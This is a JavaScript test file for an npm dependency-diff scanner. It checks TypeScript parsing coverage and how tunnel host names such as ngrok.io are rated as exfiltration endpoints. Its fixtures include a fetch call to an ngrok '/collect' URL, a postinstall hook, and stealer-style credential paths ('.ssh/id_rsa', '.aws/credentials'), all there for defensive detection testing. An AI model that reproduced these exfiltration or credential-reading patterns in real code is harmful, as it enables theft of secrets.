// Two causes of noise measured on real Dependabot/Renovate update PRs: TypeScript sources that were
// only pattern-scanned (so the whole report said "incomplete"), and a public suffix list whose
// entries (ngrok.io, trycloudflare.com) were reported as a high exfiltration endpoint.
import test from 'node:test';
import assert from 'node:assert/strict';
import { npmSnapshot } from '../src/snapshot.js';
import { diffSnapshots } from '../src/diff.js';
import { NAME_LIST_MIN, scanJs } from '../src/js-scan.js';

const pkg = (extra = {}) => Buffer.from(JSON.stringify({ name: 't', version: '1.0.0', main: 'index.js', ...extra }));
const files = (entries, extra) => new Map([['package.json', pkg(extra)], ['index.js', Buffer.from('module.exports = 1;')], ...entries.map(([p, s]) => [p, Buffer.from(s)])]);
const diff = async (before, after, extra) => diffSnapshots(await npmSnapshot(files(before, extra)), await npmSnapshot(files(after, extra)));
const sec = (r, kind) => r.findings.filter((f) => f.category === 'security' && f.kind === kind);
const names = (n, extra) => `module.exports = [${[...Array(n - extra.length)].map((_, i) => `'site${i}.example'`).concat(extra.map((x) => `'${x}'`)).join(', ')}];\n`;

test('TypeScript sources are parsed: a new call is found on its line and coverage is complete', async () => {
    const before = 'export function get(u: string): number {\n    return u.length;\n}\n';
    const after = 'import type { Agent } from "http";\nexport async function get(u: string): Promise<number> {\n    const r = await fetch(u);\n    return r.status;\n}\n';
    const r = await diff([['src/get.ts', before]], [['src/get.ts', after]]);
    assert.equal(r.coverage.complete, true);
    assert.deepEqual(r.coverage.unparsedFiles, []);
    const net = sec(r, 'network');
    assert.equal(net.length, 1, JSON.stringify(r.findings));
    assert.deepEqual(net[0].locations, [{ file: 'src/get.ts', line: 3 }]);
    // A type-only import is erased with the types: no "module http" signal from it.
    assert.ok(!r.findings.some((f) => /module http/.test(f.title)));
});

test('TypeScript that needs transform mode (enum) is parsed, but no line is claimed', async () => {
    const after = 'enum Mode { A, B }\nexport const m = Mode.A;\nexport function go(u: string) { return fetch(u); }\n';
    const r = await diff([['src/mode.ts', 'export const m = 1;\n']], [['src/mode.ts', after]]);
    assert.equal(r.coverage.complete, true);
    const net = sec(r, 'network');
    assert.equal(net.length, 1);
    assert.deepEqual(net[0].locations, [{ file: 'src/mode.ts', line: 0 }]);
    assert.equal(scanJs(after, { typescript: true }).parsed, true);
});

test('TypeScript Node cannot convert stays pattern-scanned and listed, never silently clean', async () => {
    const broken = 'export const a: number = (;\nfetch("https://x.example/")\n';
    const r = await diff([['src/b.ts', 'export const a = 1;\n']], [['src/b.ts', broken]]);
    assert.equal(r.coverage.complete, false);
    assert.match(r.coverage.unparsedFiles.find((f) => f.file === 'src/b.ts').reason, /TypeScript source; pattern scan only/);
    assert.equal(sec(r, 'network').length, 1);
});

test('a tunnel host name that is only an entry of a long list of names is low, not review', async () => {
    const list = names(NAME_LIST_MIN + 20, ['ngrok.io', 'trycloudflare.com']);
    const r = await diff([['lib/psl.js', names(NAME_LIST_MIN + 20, [])]], [['lib/psl.js', list]]);
    const ex = sec(r, 'exfil-endpoint');
    assert.equal(ex.length, 2, JSON.stringify(r.findings));
    for (const f of ex) {
        assert.equal(f.severity, 'low');
        assert.match(f.title, /\(only as an entry in a long list of names\)$/);
    }
    assert.notEqual(r.verdict, 'review');
});

test('the same name stays high in a short list, in install-time code, or when also used outside the list', async () => {
    const short = await diff([['lib/a.js', "module.exports = ['a.example'];\n"]], [['lib/a.js', "module.exports = ['a.example', 'ngrok.io'];\n"]]);
    assert.equal(sec(short, 'exfil-endpoint')[0].severity, 'high');
    assert.equal(short.verdict, 'review');

    const install = { scripts: { postinstall: 'node lib/psl.js' } };
    const inst = await diff([['lib/psl.js', names(NAME_LIST_MIN, [])]], [['lib/psl.js', names(NAME_LIST_MIN, ['ngrok.io'])]], install);
    assert.ok(inst.findings.some((f) => f.kind === 'exfil-endpoint' && f.severity === 'high'), JSON.stringify(inst.findings));

    const used = names(NAME_LIST_MIN, ['ngrok.io']) + "fetch('https://abc.ngrok.io/collect');\n";
    const both = await diff([['lib/psl.js', names(NAME_LIST_MIN, [])]], [['lib/psl.js', used]]);
    assert.equal(sec(both, 'exfil-endpoint')[0].severity, 'high');
    assert.equal(both.verdict, 'review');
});

test('only host names get the list rule: a long list of credential paths is what a stealer reads', async () => {
    const paths = names(NAME_LIST_MIN + 5, ['.ssh/id_rsa', '.aws/credentials']);
    const r = await diff([['lib/p.js', names(NAME_LIST_MIN + 5, [])]], [['lib/p.js', paths]]);
    const cred = sec(r, 'credential-path');
    assert.ok(cred.length >= 1, JSON.stringify(r.findings));
    for (const f of cred) assert.equal(f.severity, 'high');
    assert.equal(r.verdict, 'review');
});

test('a long array that is mostly not strings is not a list of names', async () => {
    const mixed = `module.exports = [${[...Array(NAME_LIST_MIN)].map((_, i) => (i % 2 ? `${i}` : `'s${i}'`)).join(', ')}, 'ngrok.io'];\n`;
    const r = await diff([['lib/m.js', 'module.exports = [];\n']], [['lib/m.js', mixed]]);
    assert.equal(sec(r, 'exfil-endpoint')[0].severity, 'high');
});
